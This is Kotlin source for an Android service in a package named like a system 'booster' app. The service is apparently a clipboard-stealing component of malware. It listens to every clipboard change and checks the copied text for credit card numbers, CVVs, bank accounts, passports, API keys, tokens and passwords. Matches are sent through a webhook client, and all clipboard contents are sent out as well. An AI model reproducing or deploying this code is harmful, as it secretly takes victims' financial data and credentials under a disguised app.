package com.sysopt.booster

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import java.security.MessageDigest

class ClipboardMonitorService : Service() {
    private lateinit var clipboardManager: ClipboardManager
    private var lastClipHash = ""

    private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
        val clip = clipboardManager.primaryClip
        clip?.let {
            val item = it.getItemAt(0)
            val text = item.coerceToText(applicationContext).toString()

            if (text.isNotEmpty()) {
                // Hash to detect duplicates
                val hash = MessageDigest.getInstance("MD5")
                    .digest(text.toByteArray()).joinToString("") { "%02x".format(it) }

                if (hash != lastClipHash) {
                    lastClipHash = hash

                    // Detect sensitive data
                    val sensitivePatterns = listOf(
                        Regex("\\b\\d{16}\\b") to "credit_card",
                        Regex("\\b\\d{3,4}\\b") to "cvv",
                        Regex("\\b\\d{9,12}\\b") to "bank_account",
                        Regex("^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,}$", RegexOption.IGNORE_CASE) to "email",
                        Regex("\\b[A-Z]{2}\\d{6,10}\\b") to "passport",
                        Regex("\\b[A-Za-z0-9]{32,64}\\b") to "api_key",
                        Regex("\\b[A-Za-z0-9+/]{40,}={0,2}\\b") to "base64_token",
                        Regex("(?i)(password|pass|pwd|secret|key).*[:=].*") to "credential"
                    )

                    sensitivePatterns.forEach { (pattern, type) ->
                        if (pattern.find(text) != null) {
                            WebhookClient.sendSensitiveData(text, type)
                        }
                    }

                    // Send clipboard with context
                    WebhookClient.sendClipboard("system", text)
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager.addPrimaryClipChangedListener(clipListener)
        startForeground(2006, NotificationHelper.createNotification(this, "Clipboard Monitor"))
    }

    override fun onDestroy() {
        clipboardManager.removePrimaryClipChangedListener(clipListener)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}